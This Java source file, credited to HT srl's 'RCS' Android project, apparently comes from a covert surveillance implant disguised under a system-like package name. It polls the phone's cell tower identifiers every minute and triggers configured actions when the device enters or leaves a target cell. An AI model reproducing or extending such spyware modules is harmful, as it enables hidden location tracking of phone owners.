/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventCellId.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.event;

import java.io.IOException;

import com.android.service.CellInfo;
import com.android.service.Device;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfEvent;
import com.android.service.conf.ConfigurationException;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;

public class EventCellId extends BaseEvent {
	private static final String TAG = "EventCellId"; //$NON-NLS-1$

	private static final long CELLID_PERIOD = 60000;
	private static final long CELLID_DELAY = 1000;

	int actionOnEnter;
	int actionOnExit;

	int mccOrig;
	int mncOrig;
	int lacOrig;
	int cidOrig;
	boolean entered = false;

	@Override
	public void actualStart() {
		entered = false;
	}

	@Override
	public void actualStop() {
	}

	@Override
	public boolean parse(ConfEvent conf) {
		try {
			mccOrig = conf.getInt("country");
			mncOrig = conf.getInt("network");
			lacOrig = conf.getInt("area");
			cidOrig = conf.getInt("id");

			if (Cfg.DEBUG) {
				Check.log(TAG + " Mcc: " + mccOrig + " Mnc: " + mncOrig + " Lac: " + lacOrig + " Cid: " + cidOrig);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
			}

			setPeriod(CELLID_PERIOD);
			setDelay(CELLID_DELAY);

		} catch (final ConfigurationException e) {
			return false;
		}

		return true;
	}

	@Override
	public void actualGo() {
		final CellInfo info = Device.getCellInfo();
		if (!info.valid) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + "invalid cell info");//$NON-NLS-1$ //$NON-NLS-2$
			}
			return;
		}

		if ((mccOrig == -1 || mccOrig == info.mcc) && (mncOrig == -1 || mncOrig == info.mnc)
				&& (lacOrig == -1 || lacOrig == info.lac) && (cidOrig == -1 || cidOrig == info.cid)) {
			if (!entered) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Enter");//$NON-NLS-1$
				}
				entered = true;
				triggerStartAction();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " already entered");//$NON-NLS-1$
				}
			}

		} else {
			if (entered) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Exit");//$NON-NLS-1$
				}
				entered = false;
				triggerStopAction();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " already exited");//$NON-NLS-1$
				}
			}
		}
	}

}
